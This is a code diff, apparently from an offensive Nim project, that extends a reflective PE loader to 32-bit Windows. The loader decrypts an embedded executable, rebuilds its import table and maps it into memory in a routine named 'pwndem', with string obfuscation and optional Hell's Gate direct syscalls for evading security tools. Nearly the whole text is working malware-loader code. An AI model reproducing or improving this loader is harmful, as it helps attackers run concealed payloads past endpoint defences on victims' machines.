@@ -156,7 +156,10 @@ proc fixIAT*(modulePtr: PVOID): bool =
               var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
           else:
               var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
-          fieldThunk.u1.Function = ULONGLONG(libaddr)
+          when defined amd64:
+              fieldThunk.u1.Function = ULONGLONG(libaddr)
+          else:
+              fieldThunk.u1.Function = DWORD(libaddr)
         if fieldThunk.u1.Function == 0:
           break
         if fieldThunk.u1.Function == orginThunk.u1.Function:
@@ -175,9 +178,10 @@ proc fixIAT*(modulePtr: PVOID): bool =
               var hmodule: HMODULE = LoadLibraryA(libname)
               var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
           
-    
-          fieldThunk.u1.Function = ULONGLONG(libaddr)
-
+          when defined amd64:
+              fieldThunk.u1.Function = ULONGLONG(libaddr)
+          else:
+              fieldThunk.u1.Function = DWORD(libaddr)
           when defined(args):
             # patch common Win32 functions to get the command line
             if exeArgsPassed and "GetCommandLineW" == $$func_name:
@@ -195,7 +199,9 @@ proc fixIAT*(modulePtr: PVOID): bool =
     return true
 
 proc pwndem(): void =
-
+    ptrEncText = cast[ptr byte](addr encText[0])
+    ptrDecText = cast[ptr byte](addr decText[0])
+    decryptlate()
     var peToLoadPtr: ptr = dectext[0].addr
 
     var pImageBase: ptr BYTE = nil
@@ -253,8 +259,10 @@ proc pwndem(): void =
       when defined(verbose):
         echo obf("[-] Allocate Image Base At Failure.\n")
       quit()
-    
-    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
+    when defined amd64:
+        ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
+    else:
+        ntHeader.OptionalHeader.ImageBase = cast[DWORD](preferAddr)
     var bytesWritten: SIZE_T
     when defined(HellsGate):
         if getSyscall(ntWriteTable):
